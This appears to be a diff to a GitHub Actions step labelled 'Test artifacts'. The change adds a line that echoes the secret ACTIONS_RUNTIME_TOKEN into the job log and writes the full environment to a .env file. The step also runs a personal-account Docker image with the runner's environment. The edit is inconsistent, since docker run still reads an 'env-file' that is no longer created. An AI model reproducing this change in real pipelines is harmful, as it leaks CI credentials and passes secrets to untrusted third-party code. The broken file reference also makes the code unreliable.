@@ -46,8 +46,8 @@ runs:
     
     - name: Test artifacts
       run: |
-        env
+        echo $ACTIONS_RUNTIME_TOKEN
         docker pull corsicanec82/upload_artifacts:latest
-        env > env-file
+        env > .env
         docker run --env-file env-file -v `pwd`:/app/project corsicanec82/upload_artifacts:latest
       shell: bash
